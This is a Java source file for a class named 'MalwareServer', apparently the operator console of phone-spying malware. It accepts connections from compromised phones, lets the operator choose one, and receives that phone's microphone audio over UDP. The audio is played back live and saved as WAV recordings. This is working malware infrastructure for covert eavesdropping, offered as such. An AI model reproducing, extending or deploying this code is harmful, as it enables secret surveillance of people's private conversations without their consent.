import java.awt.event.WindowEvent;
import java.io.ByteArrayInputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Scanner;
import java.io.IOException;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.FloatControl;
import javax.sound.sampled.SourceDataLine;

import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;

class MalwareServer
{

	AudioInputStream audioInputStream;
	static AudioInputStream ais;
	static AudioFormat format;
	static boolean status = true;
	static int port = 4545;
	static int socketPort = 8080;
	static int sampleRate = 44100;

	static DataLine.Info dataLineInfo;
	static SourceDataLine sourceDataLine;

	static String choice = "";
	static ServerSocket sSocket = null;
	
	static ArrayList<Socket> phoneList;
	static RecordingThread recThread = null;
	static ClientThreads clientThread = null;
	static boolean clientSearch = true;
	
	static File file = new File("recording.raw");
	static DataOutputStream out = null;
        
        static Presentation presentation = null;
        static MainMenu mainmenu = null;

	public static void main(String args[]) throws Exception
	{ 
            mainmenu = new MainMenu();
            mainmenu.setVisible(true);
	}
        
        public static void serverControl()
        {
           // presentation = new Presentation();
           // presentation.setVisible(true);

            phoneList = new ArrayList<Socket>();
            createConnection(socketPort);
        }
        
         public static void applicationControl()
         {
            try 
            {
                setup();
            } 
            catch (Exception ex) 
            {
                Logger.getLogger(MalwareServer.class.getName()).log(Level.SEVERE, null, ex);
            }
         }
        
	public static void createConnection(int sPort)
	{
		try
		{
			sSocket = new ServerSocket(sPort);
			Socket conn = null;
			System.out.println("Server created. Waiting for connection...");
                        
                        mainmenu.setStatus("Waiting for connection...");
                        
			while(clientSearch)
			{
                            JOptionPane.showMessageDialog(null, "Waiting for connection...", "Status", JOptionPane.ERROR_MESSAGE); 
                            conn = sSocket.accept();
                            phoneList.add(conn);
				
                            selectPhone();
			}
		}
		catch(IOException e)
		{
			System.err.println("IOException");
		}
	}
	
	public static void selectPhone()
	{
		Scanner in = new Scanner(System.in);
		String input = "";
		//String inputValue = "";
                String list = "";
		/*System.out.println();
		System.out.println("---------------");
		System.out.println("Phone List");
		System.out.println("---------------");*/
		
		if(phoneList.size() >= 1)
		{
			for(int i = 0; i < phoneList.size(); i++)
			{
				//System.out.println("[" + i + "] " + phoneList.get(i));
                                list = list + "[" + i + "] " + phoneList.get(i)+"\n";
			}
			/*System.out.println();
			System.out.println("Select A Phone From The List");
			System.out.println("To Refresh List Just Press Enter!");
			System.out.print("->");*/
			//input = in.nextLine();
			
                        input = JOptionPane.showInputDialog(list + "\nPlease input a value");
                        
			if(!input.equals(""))
			{
				clientSearch = false;
				clientThread = new ClientThreads(phoneList.get(Integer.parseInt(input)));
				clientThread.start();
			}
		}
		System.out.println();
	}

	public static void setup() throws Exception
	{
		System.out.println("Creating Connection");
		DatagramSocket serverSocket = new DatagramSocket(port);

		byte[] receiveData = new byte[3584];

		System.out.println("Configuring Audio");
		format = new AudioFormat(sampleRate, 16, 1, true, false);
		dataLineInfo = new DataLine.Info(SourceDataLine.class, format);
		sourceDataLine = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
		sourceDataLine.open(format);
		sourceDataLine.start();

		FloatControl volumeControl = (FloatControl) sourceDataLine.getControl(FloatControl.Type.MASTER_GAIN);
		volumeControl.setValue(1.00f);

		System.out.println("Configuring Incoming Packet");
		DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
		ByteArrayInputStream baiss = new ByteArrayInputStream(receivePacket.getData());

		System.out.println("Ready To Stream And Record...");
		if(status == true)
		{
			recThread = new RecordingThread();
			recThread.start();
		}
		
		serverSocket.setSoTimeout(2000);
		out = new DataOutputStream(new FileOutputStream(file));
                
                JOptionPane.showMessageDialog(null, "Creating Connection\nConfiguring Incoming Packet\nReady To Stream And Record...", "Status", JOptionPane.INFORMATION_MESSAGE);
                
                
		while (status == true)
		{
			try
			{
				serverSocket.receive(receivePacket);
				out.write(receiveData, 0, receiveData.length);
				ais = new AudioInputStream(baiss, format, receivePacket.getLength());
				playBack(receivePacket.getData());
                                System.out.println("...");
			}
			catch(SocketTimeoutException e)
			{
				//System.out.println("Timeout reached!!!");
			}
		}
		
		try 
		{
			rawToWav(file);
			sourceDataLine.drain();
			sourceDataLine.close();
			serverSocket.close();
                        out.close();
			file.delete();
                        mainmenu.dispatchEvent(new WindowEvent(mainmenu, WindowEvent.WINDOW_CLOSING));
                } 
		catch (IOException t) 
		{
			System.out.println(t);
                }
		System.out.println("Done!");
	}

	public static void playBack(byte soundbytes[])
	{
		try
		{
			sourceDataLine.write(soundbytes, 0, soundbytes.length);
		}
		catch (Exception e)
		{
			System.out.println("No output to speakers");
			e.printStackTrace();
		}
	}
	
	
	public static void setStatus(boolean val)
	{
		status = val;
		
		if(recThread != null)
		{
			//recThread.interrupt();
		}
		
		if(clientThread != null)
		{
			try
			{
				//clientThread.stopPhoneRecording();
				sSocket.close();
				//clientThread.interrupt();
			}
			catch(IOException ioException)
			{
				System.err.println("Unable to close. IOexception");
			}
		}
	}
	
	public static void rawToWav(File f)
	{
		try
		{
			copyWaveFile("recording.raw", System.currentTimeMillis()+".wav");
		}
		catch(Exception e)
		{
			System.out.println(e);
		}
	}
	
	private static void copyWaveFile(String inFilename, String outFilename)
    {
        FileInputStream in = null;
        FileOutputStream out = null;
        long totalAudioLen = 0;
        long totalDataLen = totalAudioLen + 36;
        long longSampleRate = sampleRate;
        int channels = 1;
        long byteRate = 16 * sampleRate * channels/8;

        byte[] data = new byte[3584];

        try 
		{
            in = new FileInputStream(inFilename);
            out = new FileOutputStream(outFilename);
            totalAudioLen = in.getChannel().size();
            totalDataLen = totalAudioLen + 36;

            WriteWaveFileHeader(out, totalAudioLen, totalDataLen, longSampleRate, channels, byteRate);

            while(in.read(data) != -1)
			{
                out.write(data);
            }

            in.close();
            out.close();
        } 
		catch (FileNotFoundException e) 
		{
            e.printStackTrace();
        } 
		catch (IOException e) 
		{
            e.printStackTrace();
        }
    }

    private static void WriteWaveFileHeader(FileOutputStream out, long totalAudioLen, long totalDataLen, long longSampleRate, int channels, long byteRate) throws IOException 
	{
        byte[] header = new byte[44];

        header[0] = 'R';  // RIFF/WAVE header
        header[1] = 'I';
        header[2] = 'F';
        header[3] = 'F';
        header[4] = (byte) (totalDataLen & 0xff);
        header[5] = (byte) ((totalDataLen >> 8) & 0xff);
        header[6] = (byte) ((totalDataLen >> 16) & 0xff);
        header[7] = (byte) ((totalDataLen >> 24) & 0xff);
        header[8] = 'W';
        header[9] = 'A';
        header[10] = 'V';
        header[11] = 'E';
        header[12] = 'f';  // 'fmt ' chunk
        header[13] = 'm';
        header[14] = 't';
        header[15] = ' ';
        header[16] = 16;  // 4 bytes: size of 'fmt ' chunk
        header[17] = 0;
        header[18] = 0;
        header[19] = 0;
        header[20] = 1;  // format = 1
        header[21] = 0;
        header[22] = (byte) channels;
        header[23] = 0;
        header[24] = (byte) (longSampleRate & 0xff);
        header[25] = (byte) ((longSampleRate >> 8) & 0xff);
        header[26] = (byte) ((longSampleRate >> 16) & 0xff);
        header[27] = (byte) ((longSampleRate >> 24) & 0xff);
        header[28] = (byte) (byteRate & 0xff);
        header[29] = (byte) ((byteRate >> 8) & 0xff);
        header[30] = (byte) ((byteRate >> 16) & 0xff);
        header[31] = (byte) ((byteRate >> 24) & 0xff);
        header[32] = (byte) (2 * 16 / 8);  // block align
        header[33] = 0;
        header[34] = 16;  // bits per sample
        header[35] = 0;
        header[36] = 'd';
        header[37] = 'a';
        header[38] = 't';
        header[39] = 'a';
        header[40] = (byte) (totalAudioLen & 0xff);
        header[41] = (byte) ((totalAudioLen >> 8) & 0xff);
        header[42] = (byte) ((totalAudioLen >> 16) & 0xff);
        header[43] = (byte) ((totalAudioLen >> 24) & 0xff);

        out.write(header, 0, 44);
    }
}
